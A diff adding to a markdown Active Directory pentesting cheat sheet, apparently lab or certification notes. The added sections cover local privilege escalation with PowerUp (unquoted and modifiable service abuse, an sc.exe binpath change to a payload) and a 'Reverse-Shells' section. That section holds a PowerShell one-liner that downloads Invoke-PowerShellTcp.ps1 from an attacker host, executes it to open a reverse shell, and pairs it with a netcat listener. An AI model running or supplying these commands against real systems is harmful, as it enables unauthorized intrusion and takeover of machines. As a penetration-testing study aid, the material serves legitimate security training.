@@ -83,7 +83,7 @@ Check if AD rights are binded to a specific group instead of users
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<Group_name>"}
 ```
 
-### Enumerate the Domain Trust
+### Enumerate the Domain Trust using PowerView.ps1
 Enumerate all the domains in the forest
 ```
 Get-ForestDomain -Verbose
@@ -93,6 +93,61 @@ Map the trust of the current domain, choose the trust attribute basing on the av
 ```
 Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "<Trust_attribute>"}
 ```
+
+## Privilege Escalation
+### Local Admin Privilege Escalation using PowerUp.ps1
+Load the PowerUp.ps1 module
+```
+. .\PowerUp.ps1
+```
+
+Enumerate exploitable unquoted service
+```
+Get-ServiceUquoted
+```
+
+Enumerate services vulnerable to config modify
+```
+Get-ModifiableServices
+```
+
+Add user to local admin group using PowerView.ps1 (**Noisy**)
+```
+Invoke-ServiceAbuse -Name '<service_name>' -Username <domain\username>
+```
+
+Add user to local admin group using sc.exe (**more OPSEC**)
+```
+sc.exe <service_name> config binpath= "\\dcorp-student499\payload.exe"
+```
+
+**NOTE:** remember to logoff and logon to apply the changes
+
+Enumerate where the user has local admin privileges inside the domain using Find-PSRemotingLocalAdminAccess.ps1
+```
+. .\Find-PSRemotingLocalAdminAccess.ps1
+```
+
+Perform the enumeration
+```
+Find-PSRemotingLocalAdminAccess
+```
+
+## Reverse-Shells
+Command to download and execute a reverse-shell
+```
+powershell iex (iwr -UseBasicParsing http://<my_ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IpAddress <my_ip> -Port 443
+```
+
+**Note:** Remember to start the listener
+```
+nc64.exe -lvp 443
+```
+
+**Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)
+
+
+
 
 
 
